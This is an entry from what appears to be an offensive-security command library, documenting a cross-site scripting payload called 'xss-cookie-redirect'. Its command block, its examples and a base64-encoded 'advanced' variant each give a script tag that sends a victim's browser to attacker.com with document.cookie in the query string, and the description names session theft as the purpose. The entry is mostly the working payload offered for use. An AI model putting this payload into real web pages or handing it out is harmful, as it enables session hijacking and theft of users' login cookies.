---
id: c9010046-9fb7-4408-86d6-7b98733fd11a
name: xss-cookie-redirect
type: command
executor: javascript
data: >-
  <script>document.location='http://attacker.com/XSS/grabber.php?c='+document.cookie</script>
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:50.154Z'
platforms:
  - Web
tags:
  - xss
  - exfiltration
verified: false
validated: true
submitted: true
---

# xss-cookie-redirect

## Command

```javascript
<script>document.location='http://attacker.com/XSS/grabber.php?c='+document.cookie</script>
```

## Description

XSS payload that redirects the browser to an attacker server, appending stolen cookies as a query parameter for remote logging and session theft.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| document.location | URL to redirect to | Yes |
| c | Query param for cookie value | Yes |

## Examples

### Basic Usage

```javascript
<script>document.location='http://attacker.com/XSS/grabber.php?c='+document.cookie</script>
```

### Advanced Usage

```javascript
<script>document.location='http://attacker.com/log.php?c='+btoa(document.cookie)</script>
```

## Expected Output

Browser redirects to the specified URL with cookies in the query string, e.g., grabber.php?c=sessionid=abc123.

## Related

- [[commands/basic-xss-alert]]
